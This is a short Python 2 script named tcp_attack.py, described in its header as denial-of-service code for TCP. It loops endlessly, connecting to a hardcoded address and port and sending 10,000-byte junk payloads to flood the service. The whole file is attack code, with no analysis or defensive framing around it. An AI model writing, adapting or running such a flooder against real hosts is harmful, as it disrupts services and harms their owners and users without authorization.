import socket

#============================================================
# Module: tcp_attack.py
# Author: Patrick Blanchard
# Purpose: Creates dos code for tcp.
# Date: November 8, 2016
#=============================================================

HOST = "10.0.0.1"
PORT = 5000

def attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.send("A" * 10000)
        s.close()
    except:
        print "Connection failed"
        pass

while(True):
        attack()
